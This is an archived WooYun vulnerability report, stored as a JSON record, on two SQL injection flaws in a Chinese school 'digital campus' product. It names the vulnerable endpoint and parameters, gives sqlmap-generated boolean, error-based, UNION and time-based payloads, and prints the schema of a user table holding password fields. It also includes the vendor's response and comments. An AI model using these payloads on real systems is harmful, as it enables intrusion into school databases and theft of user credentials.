{"id": 57572, "wybug_id": "wooyun-2014-053967", "wybug_title": "某通用数字校园两处sql注射", "wybug_corp": "北京乐知行软件有限公司", "wybug_author": "Haswell", "wybug_date": "2014-03-24 16:31", "wybug_open_date": "2014-06-22 16:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-31：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-22：\t细节向公众公开  简要描述： 就是这样。。。目测北京80%学校安装率(估计是政府重点扶持项目之类的) 详细说明：  http://www.lezhixing.com.cn/cms/lzx/case/index.jhtml登陆后 /datacenter/gyTeacher/listing.do?此处两个参数，viewColumnscriteria由于过滤不全存在sql注入\n\n\n\n   漏洞证明：  ---Place: GETParameter: criteria    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: criteria=1 AND 7060=7060    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: criteria=1 AND (SELECT 6192 FROM(SELECT COUNT(*),CONCAT(0x7177637471,(SELECT (CASE WHEN (6192=6192) THEN 1 ELSE 0 END)),0x71636d6f71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) - 1 column    Payload: criteria=1 UNION ALL SELECT CONCAT(0x7177637471,0x747a6943746d6d786443,0x71636d6f71)#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: criteria=1 AND SLEEP(5)---web application technology: Nginxback-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---注入，root权限aq_user表里这样：---web application technology: Nginxback-end DBMS: MySQL 5.0Database: data_prd_v3Table: aq_user[36 columns]+---------------------+--------------+| Column              | Type         |+---------------------+--------------+| version             | varchar(20)  || ALLOWUPDATEQUESTION | bigint(22)   || BLOCKED             | bigint(22)   || lastonlinetime      | datetime     || lzy_email           | varchar(200) || NAME                | varchar(30)  || PASSWORD            | varchar(200) || PWANSWER            | varchar(60)  || PWQUESTION          | varchar(100) || salary_password     | varchar(200) || SCRQ                | timestamp    || space_name          | varchar(200) || spzt                | varchar(20)  || SUPERUSER           | bigint(22)   || syscode             | varchar(255) || uid                 | int(11)      || user_face           | varchar(255) || USER_ID             | varchar(32)  || user_power          | tinyint(4)   || user_sign           | varchar(255) || user_status         | tinyint(4)   || USERADDR            | varchar(100) || USERBUILDDATE       | timestamp    || USERCHANGEPWSYMBOL  | bigint(22)   || USEREMAIL           | varchar(100) || USERFORBIDSYMBOL    | bigint(22)   || USERINVALIDDATE     | timestamp    || USERINVALIDSYMBOL   | bigint(22)   || USERLOCKDATE        | timestamp    || USERNAME            | varchar(60)  || USERNUMBER          | varchar(32)  || USERPWINVALIDDATE   | timestamp    || USERPWMINLENGTH     | decimal(5,0) || USERTEL             | varchar(30)  || USERTYPE            | varchar(2)   || zjhm                | varchar(40)  |+---------------------+--------------+viewColumns参数也是一样。   修复方案：  过滤求cnvd证书一枚~ ……快要申请大学咯有用==   版权声明：转载请注明来源 Haswell@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2014-03-28 15:51 厂商回复： CNVD确认所述情况（复现过程由教育网应急组织——上海交通大学网络信息中心协助完成），根据测试结果，主要影响中学。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-21 18:05 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  祝高rank！    \n     2014-03-21 19:21 |    \t\tHaswell \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:18        | HorizonSec @ RDFZ)\t\t \n  @Coffee 汗…………写的巨简洁还以为过不了了……    \n     2014-03-21 19:23 |    \t\tHaswell \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:18        | HorizonSec @ RDFZ)\t\t \n  求为啥小厂商……上回某大牛跟我发的一样产品的注入就前台可见……  π_ππ_π@xsser     \n     2014-04-24 23:29 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  好腻害！话说小厂商是啥意思QAQ    \n     2014-04-24 23:33 |    \t\tCoffee \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:15        | Corie, a student of RDFZ.)\t\t \n  @橘子 群里那个新来的橘子吗？欢迎～    \n     2014-04-25 07:23 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  @Coffee 恩恩^_−☆    \n     2014-06-26 13:17 |    \t\t汪哥 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:6        )\t\t \n  加油    \n     2014-06-26 15:19 |    \t\tHaswell \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:18        | HorizonSec @ RDFZ)\t\t \n  @汪哥 ：）    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}